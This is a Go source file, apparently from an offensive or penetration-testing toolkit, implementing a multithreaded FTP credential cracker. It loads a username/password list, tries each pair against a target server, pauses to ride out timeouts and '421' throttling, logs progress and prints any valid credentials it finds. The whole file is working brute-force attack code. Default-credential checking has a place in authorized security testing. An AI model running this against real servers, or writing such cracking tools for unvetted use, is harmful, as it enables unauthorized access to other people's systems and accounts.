package Hydra

import (
	"Ariadne/ElasticLog"
	"fmt"
	"github.com/jlaffaye/ftp"
	"strings"
	"sync"
	"time"
)

type FTP struct {
	target string    // ip:port type
	done   int       // done and total creds to be tested
	total  int

	CredList CredList

	findOneOnly bool
	foundCred bool

	logger      	*ElasticLog.Logger

	threads 		 int
	ModuleName 		 string
	kill			 bool
	parentWaitGroup *sync.WaitGroup
	lock 			 sync.Mutex

	credentials chan Cred
}

func FTPDefaultCredentialCheck(target,filename string,threads int,logger *ElasticLog.Logger,parentWaitGroup *sync.WaitGroup)FTP{
	newDefaultCredList := CredList{}
	err := newDefaultCredList.SetCredFile(filename)
	newDefaultCredList.SetCrossConnectStrategy(false)
	if err!=nil {
		panic(err)
	}
	newFTPCracker := FTP{
		target:          target,
		done:            0,
		total:           0,
		CredList:        newDefaultCredList,
		findOneOnly:     true,
		foundCred:       false,
		logger:          logger,
		threads:         threads,
		ModuleName:      "FTPCrack",
		kill:            false,
		parentWaitGroup: parentWaitGroup,
	}
	return newFTPCracker
}

func (ftpCrack *FTP) StartCracking(){
	ftpCrack.credentials = ftpCrack.CredList.GetCredentialChannel()
	ftpCrack.total = ftpCrack.CredList.TotalCreds
	ftpCrack.parentWaitGroup.Add(ftpCrack.threads)
	for i:=0;i<ftpCrack.threads;i++{
		go ftpCrack.CheckCredentials(ftpCrack.credentials,ftpCrack.parentWaitGroup)
	}
}

func (ftpCrack *FTP) KillCrackingSession(){
	ftpCrack.kill = true
	close(ftpCrack.credentials)   // to kill all threads
}

func (ftpCrack *FTP)CheckCredentials(credentials chan Cred,group *sync.WaitGroup){
	defer group.Done()
	for credential := range credentials {
		if !ftpCrack.kill {
			isValid := ftpCrack.CheckFTPCredential(ftpCrack.target, credential.Username, credential.Password)
			if !ftpCrack.kill{
				ftpCrack.lock.Lock()
				ftpCrack.done += 1
				if ftpCrack.done == ftpCrack.total {
					ftpCrack.KillCrackingSession()
				}
				ftpCrack.lock.Unlock()
				ftpCrack.logger.SendLog(ElasticLog.NewProgressLog(ftpCrack.ModuleName, ftpCrack.target, ftpCrack.done, ftpCrack.total))
			}
			if isValid && !ftpCrack.kill{
				ftpCrack.foundCred = true
				if ftpCrack.findOneOnly {
					ftpCrack.KillCrackingSession()
					ftpCrack.kill = true // Update 2 - seems to work with different function to update the value in struct
					ftpCrack.logger.SendLog(ElasticLog.NewProgressLog(ftpCrack.ModuleName, ftpCrack.target, ftpCrack.total, ftpCrack.total))
				}
			}
		}
	}
}

func (ftpCrack *FTP) CheckFTPCredential (target,username,password string) bool {
	timeoutError := fmt.Sprintf("dial tcp %s: i/o timeout",target)
	for ;!ftpCrack.kill;{
		conn, err := ftp.Dial(target, ftp.DialWithTimeout(20*time.Second))
		if err != nil{
			if err.Error() == timeoutError {
				ftpCrack.logger.SendLog(ElasticLog.NewLog("DEBUG","Taking a long break due to i/o timeout",ftpCrack.ModuleName))
				time.Sleep(time.Minute*2)
			}
			if strings.Contains(err.Error(),"421") {
				ftpCrack.logger.SendLog(ElasticLog.NewLog("ERROR",err.Error(),ftpCrack.ModuleName))
				time.Sleep(time.Minute*2)
			}
			ftpCrack.logger.SendLog(ElasticLog.NewLog("ERROR",err.Error(),ftpCrack.ModuleName))
			continue
		}
		err = conn.Login(username, password)
		if err == nil {
			ftpCrack.logger.SendLog(NewCredential(username,password,true,6,ftpCrack.ModuleName,target))
			fmt.Printf("[+] [%s] Possible Valid Credentials for %s => %s : %s \n",ftpCrack.ModuleName,target,username,password)
			return true
		} else if strings.Contains(err.Error(),"530") {
			ftpCrack.logger.SendLog(NewCredential(username,password,false,0,ftpCrack.ModuleName,target))
			time.Sleep(time.Second*4)
			return false
		}
	}
	return false
}